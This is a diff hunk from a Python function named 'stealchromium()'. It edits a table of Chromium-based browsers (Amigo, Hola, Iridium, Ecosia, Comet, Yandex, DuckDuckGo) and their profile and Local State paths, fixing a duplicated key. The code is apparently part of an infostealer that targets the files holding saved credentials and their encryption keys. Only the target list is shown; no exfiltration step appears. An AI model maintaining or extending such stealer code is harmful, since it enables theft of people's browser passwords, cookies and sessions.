@@ -204,7 +204,7 @@ def stealchromium():
         'Amigo': {'path': localappdata + '\\Amigo\\User Data', 'localstate': localappdata + '\\Amigo\\User Data\\Local State'},
         'Hola': {'path': localappdata + '\\Hola\\chromium_profile', 'localstate': localappdata + '\\Hola\\chromium_profile\\Local State'},
         'Iridium': {'path': localappdata + '\\Iridium\\User Data', 'localstate': localappdata + '\\Iridium\\User Data\\Local State'},
-        'Iridium': {'path': localappdata + '\\EscosiaBrowser\\User Data', 'localstate': localappdata + '\\EscosiaBrowser\\User Data\\Local State'},
+        'Escosia': {'path': localappdata + '\\EscosiaBrowser\\User Data', 'localstate': localappdata + '\\EscosiaBrowser\\User Data\\Local State'},
         'Comet': {'path': localappdata + '\\Perplexity\\Comet\\User Data', 'localstate': localappdata + '\\Perplexity\\Comet\\User Data\\Local State'},
         'Yandex': {'path': localappdata + '\\Yandex\\YandexBrowser\\User Data', 'localstate': localappdata + '\\Yandex\\YandexBrowser\\User Data\\Local State'},
         'DuckDuckGo': {'path': localappdata + '\\Packages\\DuckDuckGo.DesktopBrowser_ya2fgkz3nks94\\LocalState\\EBWebView', 'localstate': localappdata + '\\Packages\\DuckDuckGo.DesktopBrowser_ya2fgkz3nks94\\LocalState\\EBWebView\\Local State'},
